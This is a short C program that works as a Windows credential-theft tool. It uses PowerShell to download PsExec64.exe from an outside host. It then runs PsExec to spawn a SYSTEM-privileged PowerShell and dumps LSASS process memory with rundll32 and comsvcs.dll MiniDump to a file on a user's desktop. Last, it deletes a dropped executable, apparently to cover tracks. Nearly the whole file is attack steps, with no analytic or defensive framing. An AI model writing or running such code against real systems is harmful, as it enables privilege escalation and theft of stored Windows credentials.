#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int c, char *argv[]){
	printf("exe executed, downloading psexec.exe\n");
	system("powershell -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','$HOME\\p.exe')) }\"");
	//run powershell with system privs
	system("powershell -C \"$HOME\\p.exe -i -s powershell \"");
	//system("powershell -exec bypass -C \"& { ((New-Object System.Net.WebClient).DownloadFile('http://live.sysinternals.com/PsExec64.exe','C:\\Windows\\Temp\\pe.exe')) } \"");
	system("C:/Windows/system32/rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Jacob\\Desktop\\lsass.dmp full");

	getchar();
	system("rm %USERPROFILE%\\d.exe");
	return 0;
}